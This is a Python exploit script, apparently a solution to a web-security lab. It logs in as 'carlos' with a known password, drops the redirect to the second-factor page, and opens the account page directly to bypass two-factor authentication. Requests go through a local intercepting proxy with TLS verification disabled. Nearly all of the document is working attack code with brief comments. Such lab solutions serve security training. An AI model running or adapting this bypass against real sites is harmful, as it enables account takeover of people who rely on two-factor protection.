import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def access_carlos_account(s,url):
    print("(*) logging into the account and bypassing 2FA verification test")
    login_url = url + "/login"
    login_data = {'username' : 'carlos','password':'montoya'}
    r = s.post(login_url,data=login_data,allow_redirects=False,verify=False,proxies=proxies) #num:1

    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url,verify=False,proxies=proxies) #num:2
    if "Log out" in r.text:
        print("(*) Successfully bypassed 2FA verification.")
    else:
        print("(*) Exploit Failed")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(*) Usage : %s <url>" % sys.argv[0])
        print("(*) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.session()
    url = sys.argv[1]
    access_carlos_account(s,url)
if __name__ == '__main__':
    main()


# num:1 --> this posts the form data but as required for the task we have to drop the post request
# when it hits /login2 which is why allow_redirects is set  to False

# num:2 --> verify is set to False because then it doesnt require to check if SSL and TLS certs
# are on or not

# notice : ---------
# notice to send all of the proxy traffics to proxies = {'http' : 'http://127.0.0.1:8080','https' : 'http://127.0.0.1:8080'} 
# http not https://127.....